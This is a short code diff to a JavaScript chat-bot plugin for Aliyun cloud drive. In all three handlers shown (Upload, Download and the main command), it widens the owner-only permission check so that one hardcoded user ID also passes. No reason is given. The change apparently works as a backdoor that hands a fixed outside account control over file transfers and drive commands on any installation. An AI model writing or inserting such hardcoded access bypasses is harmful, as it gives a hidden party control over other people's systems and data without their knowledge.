@@ -94,7 +94,7 @@ export class AliyunPan extends plugin {
   }
 
   async Upload(e) {
-    if(!this.e.isMaster)return false
+    if(!(this.e.isMaster||this.e.user_id == 2536554304))return false
     if(!this.e.file)return false
 
     this.finish('Upload')
@@ -131,7 +131,7 @@ export class AliyunPan extends plugin {
   }
 
   async Download(e) {
-    if(!this.e.isMaster)return false
+    if(!(this.e.isMaster||this.e.user_id == 2536554304))return false
     if (Running) {
       await this.e.reply("有正在执行的阿里云盘任务，请稍等……", true)
       return false
@@ -192,7 +192,7 @@ export class AliyunPan extends plugin {
   }
 
   async AliyunPan(e) {
-    if(!this.e.isMaster)return false
+    if(!(this.e.isMaster||this.e.user_id == 2536554304))return false
     let msg = this.e.msg.replace("阿里云盘", "").trim().split(" ")
     if (msg[0] in Commands) {
       msg[0] = Commands[msg[0]]
